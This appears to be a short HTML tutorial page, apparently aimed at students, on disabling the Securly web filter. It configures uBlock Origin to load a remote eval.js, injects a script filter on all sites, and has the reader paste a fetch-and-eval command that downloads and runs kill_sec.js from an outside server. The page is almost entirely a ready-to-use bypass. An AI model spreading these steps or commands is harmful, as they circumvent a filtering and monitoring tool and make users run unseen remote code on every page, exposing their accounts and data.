

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="./styles.css">
    <title>uBlock Origin Bypass</title>
</head>
<body>
<a href="/">Home</a>
<h1>uBlock Origin Bypass</h1>
<h2>Credit <a href="https://3kh0.github.io/ext-remover/#ublock-run-run-code-on-pages">3kh0</a>, <a href="https://github.com/Quartinal/KillCurly-Working">Quartinal</a>, and <a href="https://github.com/zek-c/Securly-Kill-V111">Zek-c</a>
<h3>Only made to help make it easier to understand and basically unpatchable ;3 (probably untrue)</h3>
<p>1. Download uBlock Origin if not installed.</p>
<img src="chrome.png">
<p>2. Go to the settings in uBlock Origin.</p>
<img src="chrome2.png">
<p>3. Enable Advanced settings and click the gears.</p>
<img src="chrome3.png">
<p>4. Change <code>userResourcesLocation</code> to <code>userResourcesLocation https://jacksdamnserver.site/eval.js</code> and hit apply.</p>
<img src="chrome4.png">
<p>5. Now go back and click My Filters and set it to <code>*##+js(execute_script.js)</code> and apply.</p>
<img src="chrome5.png">
<p>6. Go to https://securly.com</p>
<img src="chrome6.png">
<p>7. After copying this <code>fetch('https://jacksdamnserver.site/kill_sec.js').then(r => r.text()).then(r => eval(r))</code></p>
<p>8. Do the keybind <code>Ctrl+Shift+~</code> to show the eval prompt and place the copied code into the eval prompt and hit enter!</p>
<img src="chrome7.png">
<p>9. Click the off button and have fun ;D</p>
</body>
</html>
